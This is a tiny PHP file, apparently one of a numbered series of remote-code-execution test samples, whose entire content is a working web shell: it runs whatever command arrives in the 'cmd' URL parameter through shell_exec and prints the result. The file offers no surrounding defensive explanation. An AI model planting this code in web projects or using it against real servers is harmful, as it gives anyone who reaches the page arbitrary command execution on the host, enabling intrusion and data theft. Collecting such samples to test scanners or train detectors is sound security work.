<?php
// RCE test variation #1282
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>